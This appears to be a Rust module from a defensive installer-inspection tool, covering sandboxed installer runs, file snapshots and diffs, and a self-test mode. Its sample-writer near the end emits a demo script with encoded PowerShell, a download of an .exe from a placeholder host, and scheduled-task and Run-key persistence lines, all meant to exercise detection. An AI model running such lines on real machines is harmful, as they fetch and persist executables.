//! End-to-end workflows wiring the five modules together.

use crate::cleanup::CleanupController;
use crate::json::Value;
use crate::rea_bridge::{ReaBridge, ReaConfig, ScanIssue};
use crate::registry_sandbox::RegistrySandbox;
use crate::snapshot::Snapshot;
use crate::universal_sandbox::{run_issue, Sandbox, SandboxConfig};
use crate::util::unix_secs;
use crate::{Error, Result};
use std::path::{Path, PathBuf};

pub struct ScanOptions {
    pub target: PathBuf,
    pub rea_path: Option<PathBuf>,
}

/// Mode A — Local Program Inspection.
pub fn mode_scan(opts: ScanOptions) -> Result<Value> {
    let bridge = ReaBridge::new(ReaConfig { rea_path: opts.rea_path, timeout: None });
    let report = bridge.analyze(&opts.target)?;
    Ok(Value::obj(vec![
        ("schema_version", Value::num(crate::SCHEMA_VERSION)),
        ("mode", Value::str("local-scan")),
        ("generated_unix", Value::num(unix_secs())),
        ("verdict", Value::str(report.verdict())),
        ("coverage", crate::coverage::block(
            vec![("analysis", report.scan_issues.clone())], vec![],
        )),
        ("report", report.to_json()),
    ]))
}

/// Reopen an archived inspection without touching its original target.
pub fn mode_report(path: &Path) -> Result<Value> {
    crate::report::load(path)
}

pub struct SandboxOptions {
    pub installer: PathBuf,
    pub installer_args: Vec<String>,
    pub rea_path: Option<PathBuf>,
    pub sandbox: SandboxConfig,
}

/// Mode B — Ephemeral Sandbox & Differential Installer Inspection.
/// Steps 1–6 of the blueprint workflow; purge runs on *every* exit path
/// unless `--keep` was given (the hive is always unmounted).
pub fn mode_sandbox(opts: SandboxOptions) -> Result<Value> {
    // 2. Environment preparation
    let sandbox = Sandbox::prepare(opts.sandbox.clone())?;
    let mut registry = RegistrySandbox::new(&sandbox.root, &sandbox.id);
    let mut registry_warning: Option<String> = None;
    if let Err(e) = registry.mount() {
        // Non-admin / no seeded hive: continue with env redirection and
        // say so in the report instead of failing the inspection.
        registry_warning = Some(e.to_string());
    }
    let install_dir = sandbox.install_dir.clone();

    let result = run_sandbox_inner(&opts, &sandbox, &install_dir, &registry);

    // 6. Teardown & purge (also on analysis failure).
    let mut purge_json = Value::Null;
    let mut purge_error: Option<String> = None;
    if opts.sandbox.keep {
        if let Err(e) = registry.unmount() { purge_error = Some(e.to_string()); }
    } else {
        match CleanupController::purge_sandbox(&sandbox.root, Some(&mut registry), false) {
            Ok(p) => purge_json = Value::obj(vec![
                ("path", Value::str(p.path)),
                ("removed", Value::Bool(p.removed)),
                ("verified_zero_residue", Value::Bool(p.verified_zero_residue)),
            ]),
            Err(e) => purge_error = Some(e.to_string()),
        }
    }

    let mut report = result?;
    if let Value::Object(map) = &mut report {
        if let Some(w) = registry_warning { map.insert("registry_warning".into(), Value::str(w)); }
        map.insert("purge".into(), purge_json);
        if let Some(e) = purge_error { map.insert("purge_error".into(), Value::str(e)); }
        map.insert("sandbox_kept".into(), Value::Bool(opts.sandbox.keep));
        if opts.sandbox.keep {
            map.insert("sandbox_path".into(), Value::str(sandbox.root.display().to_string()));
        }
    }
    // Cleanup is the last phase, so the coverage summary is settled last: a
    // sandbox we could not purge is a machine still holding the installer's
    // files, and it is the report failing to keep its own promise.
    let failures = crate::coverage::recorded_failures(&report);
    crate::coverage::record(&mut report, failures);
    Ok(report)
}

fn run_sandbox_inner(opts: &SandboxOptions, sandbox: &Sandbox, install_dir: &Path,
                     registry: &RegistrySandbox) -> Result<Value> {
    // Baseline snapshot of the (empty) install target.
    let before = Snapshot::capture(install_dir)?;
    // Baseline of the *whole* sandbox tree: installers also drop files
    // into the redirected profile (USERPROFILE/APPDATA point at the root),
    // which an install\-only diff would silently miss.
    let sandbox_before = Snapshot::capture(&sandbox.root)?;
    // 3. Execution under containment.
    let outcome = sandbox.run_installer(&opts.installer, &opts.installer_args)?;
    // How the run ended is part of the evidence. A killed or failing
    // installer leaves behind the delta of a *partial* install, and nothing
    // in the file tree says so — only the run does.
    let execution_issues = match run_issue(outcome.timed_out, outcome.exit_code) {
        Some((stage, message)) => vec![ScanIssue::new(
            crate::util::path_to_slash_string(&opts.installer), stage, message,
        )],
        None => Vec::new(),
    };
    // 4. Post-install snapshot & delta.
    let after = Snapshot::capture(install_dir)?;
    let delta = before.diff(&after);
    let sandbox_after = Snapshot::capture(&sandbox.root)?;
    let mut sandbox_delta = sandbox_before.diff(&sandbox_after);
    // Drop our own bookkeeping areas from the whole-tree view: the install
    // dir is already reported in `delta`; tmp/work/hive are sandbox guts.
    let is_internal = |p: &str| {
        p.starts_with("install/") || p.starts_with("tmp/") || p.starts_with("work/")
            || p == "sandbox_reg.dat"
    };
    sandbox_delta.added.retain(|e| !is_internal(&e.path));
    sandbox_delta.modified.retain(|e| !is_internal(&e.path));
    sandbox_delta.deleted.retain(|e| !is_internal(&e.path));
    sandbox_delta.unchanged.retain(|e| !is_internal(&e.path));
    sandbox_delta.unverified.retain(|e| !is_internal(&e.path));
    // 5. REA inspection of exactly what the installer changed, plus the
    // installer binary itself (its own PE/scripts are evidence too).
    let bridge = ReaBridge::new(ReaConfig { rea_path: opts.rea_path.clone(), timeout: None });
    let rea_report = bridge.analyze(install_dir)?;
    // The installer is evidence in its own right: a failure to read it is
    // reported, never silently dropped from the record.
    let (installer_report, installer_error) = match bridge.analyze(&opts.installer) {
        Ok(report) => (Some(report), None),
        Err(e) => (None, Some(e.to_string())),
    };
    // Files written outside install\ (redirected profile, startup folder…)
    // are inspected too. A payload dropped into AppData is exactly as much
    // evidence as one dropped into the install tree.
    let drops_report = analyze_drops(&sandbox.root, &sandbox_delta);

    // The verdict covers *everything* analyzed. It is the worst of the
    // three parts, not their sum: installers are routinely copied into the
    // install tree, and double-counting the same binary would inflate the
    // score without adding evidence.
    let sources = [
        ("installer", installer_report.as_ref()),
        ("install_tree", Some(&rea_report)),
        ("drops", Some(&drops_report)),
    ];
    let score = sources.iter().filter_map(|(_, r)| r.map(|r| r.risk_score())).max().unwrap_or(0);
    let verdict_sources = Value::Object(
        sources
            .iter()
            .map(|(name, report)| {
                let value = match report {
                    Some(r) => Value::obj(vec![
                        ("risk_score", Value::num(r.risk_score())),
                        ("verdict", Value::str(r.verdict())),
                    ]),
                    None => Value::Null,
                };
                ((*name).to_string(), value)
            })
            .collect(),
    );

    // Snapshot coverage from the install tree and the whole sandbox, plus
    // every analysis limit and how the run itself ended. install/ is
    // snapshotted in its own right, so its sandbox-side duplicate (and our
    // tmp/work bookkeeping) is dropped here.
    let sandbox_issues = |snap: &Snapshot| -> Vec<crate::rea_bridge::ScanIssue> {
        snap.issues.iter().filter(|i| !is_internal(&i.path)).cloned().collect()
    };
    // What the sandbox could not contain is what this report cannot show:
    // an elevated installer writes where we are not looking, and a hive that
    // would not mount leaves registry persistence entirely unrecorded.
    let containment = crate::containment::to_json(
        crate::containment::elevation(), &registry.status(),
    );
    let containment_issues = crate::containment::issues(&containment)
        .into_iter()
        .map(|(stage, message)| {
            ScanIssue::new(crate::util::path_to_slash_string(&sandbox.root), stage, message)
        })
        .collect::<Vec<_>>();

    let coverage = crate::coverage::block(
        vec![
            ("containment", containment_issues),
            ("installer execution", execution_issues),
            ("install-tree snapshot (before)", before.issues.clone()),
            ("install-tree snapshot (after)", after.issues.clone()),
            ("sandbox snapshot (before)", sandbox_issues(&sandbox_before)),
            ("sandbox snapshot (after)", sandbox_issues(&sandbox_after)),
            ("installer analysis", installer_report.as_ref().map(|r| r.scan_issues.clone()).unwrap_or_default()),
            ("install-tree analysis", rea_report.scan_issues.clone()),
            ("drops analysis", drops_report.scan_issues.clone()),
        ],
        vec![("install tree", &delta), ("sandbox", &sandbox_delta)],
    );

    let mut report = Value::obj(vec![
        ("schema_version", Value::num(crate::SCHEMA_VERSION)),
        ("mode", Value::str("sandbox-installer")),
        ("generated_unix", Value::num(unix_secs())),
        ("verdict", Value::str(crate::rules::verdict_for_score(score))),
        ("risk_score", Value::num(score)),
        ("verdict_sources", verdict_sources),
        ("coverage", coverage),
        ("containment", containment),
        ("installer", Value::str(opts.installer.display().to_string())),
        ("execution", Value::obj(vec![
            ("command", Value::str(outcome.command.clone())),
            ("exit_code", outcome.exit_code.map(|c| Value::num(c as u64)).unwrap_or(Value::Null)),
            ("timed_out", Value::Bool(outcome.timed_out)),
            ("duration_ms", Value::num(outcome.duration_ms)),
            ("stdout_tail", Value::str(outcome.stdout_tail.clone())),
            ("stderr_tail", Value::str(outcome.stderr_tail.clone())),
            ("stdout_bytes", Value::num(outcome.stdout_bytes)),
            ("stderr_bytes", Value::num(outcome.stderr_bytes)),
        ])),
        ("installer_report", installer_report.map(|r| r.to_json()).unwrap_or(Value::Null)),
        ("delta", delta.to_json()),
        // Files changed outside install\ but inside the sandbox (e.g. the
        // redirected profile). Anything changed outside the sandbox tree
        // itself is, by definition, not visible to this zero-driver view.
        ("sandbox_delta", sandbox_delta.to_json()),
        ("drops_report", drops_report.to_json()),
        ("report", rea_report.to_json()),
    ]);
    if let (Some(error), Value::Object(map)) = (installer_error, &mut report) {
        map.insert("installer_error".into(), Value::str(error));
    }
    // The coverage block is a summary of the envelope, so it is finished
    // against the finished envelope: whatever the report admits it did not
    // do (analyze the installer, clean up the sandbox) becomes a coverage
    // issue here, using the same function the archive validator will use.
    let failures = crate::coverage::recorded_failures(&report);
    crate::coverage::record(&mut report, failures);
    Ok(report)
}

/// Native analysis of the files an installer added/modified **outside** the
/// install directory, with paths relative to the sandbox root.
///
/// External REA is deliberately not run here: it is invoked per target, and
/// pointing it at the sandbox root would hand it our own bookkeeping files.
/// The native analyzer covers exactly the changed set instead.
fn analyze_drops(root: &Path, delta: &crate::snapshot::Delta) -> crate::rea_bridge::ReaReport {
    use crate::rea_bridge::{
        analyze_file, content_limit_issue, ReaReport, ScanIssue, MAX_ANALYZE_BYTES,
    };
    let mut files = Vec::new();
    let mut scan_issues = Vec::new();
    for entry in delta.changed_files() {
        let path = root.join(&entry.path);
        // The snapshot recorded a regular file; re-check before reading so a
        // link planted after the snapshot cannot pull an outside file in.
        match std::fs::symlink_metadata(&path) {
            Ok(meta) if meta.is_file() => {}
            Ok(_) => {
                scan_issues.push(ScanIssue::new(
                    entry.path.clone(), "analysis", "no longer a regular file at analysis time",
                ));
                continue;
            }
            Err(e) => {
                scan_issues.push(ScanIssue::new(entry.path.clone(), "metadata", e.to_string()));
                continue;
            }
        }
        match analyze_file(&path, Path::new(&entry.path)) {
            Ok(file) => {
                if file.size > MAX_ANALYZE_BYTES {
                    scan_issues.push(content_limit_issue(&entry.path, file.size));
                }
                files.push(file);
            }
            Err(e) => scan_issues.push(ScanIssue::new(entry.path.clone(), "analysis", e.to_string())),
        }
    }
    files.sort_by(|a, b| a.path.cmp(&b.path));
    ReaReport {
        engine: "rea-offline-native".to_string(),
        target: crate::util::path_to_slash_string(root),
        files,
        external_json: None,
        scan_issues,
    }
}

/// Preflight checks for an offline machine: platform, temp/sandbox
/// writability (a full create→purge rehearsal), REA discovery.
pub fn mode_doctor(rea_path: Option<PathBuf>) -> Result<Value> {
    let bridge = ReaBridge::new(ReaConfig { rea_path, timeout: None });
    let rea_found = bridge.resolved_rea_path();
    // Rehearse the sandbox lifecycle in miniature.
    let rehearsal = (|| -> Result<bool> {
        let dir = crate::util::temp_root().join(format!("rea_sandbox_{}", crate::util::new_id()));
        std::fs::create_dir_all(&dir)?;
        std::fs::write(dir.join("doctor.txt"), b"ok")?;
        Ok(CleanupController::purge_dir(&dir, false)?.verified_zero_residue)
    })();
    // Prove the hash primitives work on *this* build, not just in CI: a
    // mangled toolchain or a bad cross-compile must be caught before an
    // operator trusts a hash in a report.
    let sha_ok = crate::sha256::hash_bytes(b"abc") == "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad";
    let md5_ok = crate::md5::hash_bytes(b"abc") == "900150983cd24fb0d6963f7d28e17f72";
    // imphash is only worth quoting if it matches everyone else's. These two
    // digests were produced by upstream pefile's get_imphash(); the second
    // exercises the frozen ordinal table, so a build that lost or "corrected"
    // it fails here instead of quietly publishing incomparable hashes.
    let imphash_ok = crate::rea_bridge::imphash(&[
        "KERNEL32.dll!Sleep".to_string(),
        "KERNEL32.dll!CreateFileW".to_string(),
        "USER32.dll!MessageBoxW".to_string(),
    ]).as_deref() == Some("84e38f1bb1f12dd4775179ef0334737c")
        && crate::rea_bridge::imphash(&[
            "wsock32.dll!#10".to_string(),
            "wsock32.dll!#11".to_string(),
            "wsock32.dll!#1".to_string(),
            "wsock32.dll!#24".to_string(),
        ]).as_deref() == Some("5a9c08dc18a3c8d966264b0e82ff61ed");
    Ok(Value::obj(vec![
        ("schema_version", Value::num(3)),
        ("mode", Value::str("doctor")),
        ("version", Value::str(env!("CARGO_PKG_VERSION"))),
        ("hashes", Value::obj(vec![
            ("sha256_selftest", Value::Bool(sha_ok)),
            ("md5_selftest", Value::Bool(md5_ok)),
            ("imphash_selftest", Value::Bool(imphash_ok)),
        ])),
        ("os", Value::str(std::env::consts::OS)),
        ("arch", Value::str(std::env::consts::ARCH)),
        // The documented advice is "run untrusted installers from a standard
        // account". Doctor states whether this session actually does, because
        // an elevated run can write past the sandbox and out of the report.
        ("elevated", match crate::containment::elevation() {
            Some(flag) => Value::Bool(flag),
            None => Value::Null,
        }),
        ("windows_job_objects", Value::Bool(cfg!(windows))),
        ("registry_hive_mount", Value::str(if cfg!(windows) {
            "available (requires SeRestorePrivilege + a valid hive file)"
        } else { "not applicable on this OS" })),
        ("temp_dir", Value::str(crate::util::temp_root().display().to_string())),
        ("sandbox_rehearsal_ok", match &rehearsal { Ok(ok) => Value::Bool(*ok), Err(_) => Value::Bool(false) }),
        ("sandbox_rehearsal_error", rehearsal.err().map(|e| Value::str(e.to_string())).unwrap_or(Value::Null)),
        ("rea", match rea_found {
            Some(p) => Value::obj(vec![("found", Value::Bool(true)), ("path", Value::str(p.display().to_string()))]),
            None => Value::obj(vec![("found", Value::Bool(false)),
                ("path", Value::str("native analyzer fallback (fully functional offline)"))]),
        }),
    ]))
}

/// `snapshot <dir>`: the manifest, plus the same coverage record a report
/// carries, so the manual workflow (snapshot → install → diff) can be gated
/// the same way a sandbox run is.
pub fn mode_snapshot(dir: &Path) -> Result<Value> {
    let snapshot = Snapshot::capture(dir)?;
    let coverage = crate::coverage::block(vec![("snapshot", snapshot.issues.clone())], vec![]);
    let mut json = snapshot.to_json();
    if let Value::Object(map) = &mut json {
        map.insert("coverage".into(), coverage);
    }
    Ok(json)
}

/// `diff <before> <after>`: what changed, and whether it can be trusted.
///
/// A delta inherits the blindness of *both* snapshots it came from. Two
/// snapshots that each failed to list the same directory agree completely —
/// and that agreement is not evidence. Both sets of issues travel with the
/// diff instead of being dropped at the door.
pub fn mode_diff(before_path: &Path, after_path: &Path) -> Result<Value> {
    let before = Snapshot::load(before_path)?;
    let after = Snapshot::load(after_path)?;
    let delta = before.diff(&after);
    let coverage = crate::coverage::block(
        vec![
            ("before snapshot", before.issues.clone()),
            ("after snapshot", after.issues.clone()),
        ],
        vec![("compare", &delta)],
    );
    let mut json = delta.to_json();
    if let Value::Object(map) = &mut json {
        map.insert("coverage".into(), coverage);
    }
    Ok(json)
}

pub fn mode_purge(path: &Path, force: bool) -> Result<Value> {
    if !path.exists() { return Err(Error::NotFound(path.to_path_buf())); }
    let report = CleanupController::purge_dir(path, force)?;
    Ok(Value::obj(vec![
        ("path", Value::str(report.path)),
        ("removed", Value::Bool(report.removed)),
        ("verified_zero_residue", Value::Bool(report.verified_zero_residue)),
    ]))
}

/// Write a sample file for trying the tool / the CI smoke run.
///
/// `pe`    — a small, structurally valid PE32+ ("demo installer") whose
///           import table and embedded strings give the analyzer and the
///           rule engine something real to chew on. It is benign: nothing
///           is executed, and the payload is plain text.
/// `script` — a text file with the same capability strings, to exercise the
///           non-PE path (entropy, indicators, rules) without any binary.
pub fn write_sample(path: &Path, kind: &str) -> Result<PathBuf> {
    let bytes = match kind.to_ascii_lowercase().as_str() {
        "pe" | "exe" | "binary" => crate::testutil::demo_installer_bytes(),
        "script" | "text" => {
            let mut text = String::new();
            text.push_str("@echo off\nrem rea-offline demo: benign sample, not a real installer\n");
            text.push_str("powershell -enc ZQBjAGgAbwAgAGgAaQA=\n");
            text.push_str("powershell -Command \"Invoke-WebRequest https://example.invalid/update.exe\"\n");
            text.push_str("schtasks /create /tn Demo /tr demo.exe /sc onlogon\n");
            text.push_str("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Demo /d demo.exe\n");
            text
                .into_bytes()
        }
        other => {
            return Err(Error::InvalidInput(format!(
                "--kind must be pe or script (got '{other}')"
            )))
        }
    };
    if let Some(parent) = path.parent() {
        if !parent.as_os_str().is_empty() {
            std::fs::create_dir_all(parent)?;
        }
    }
    std::fs::write(path, &bytes)?;
    Ok(path.to_path_buf())
}
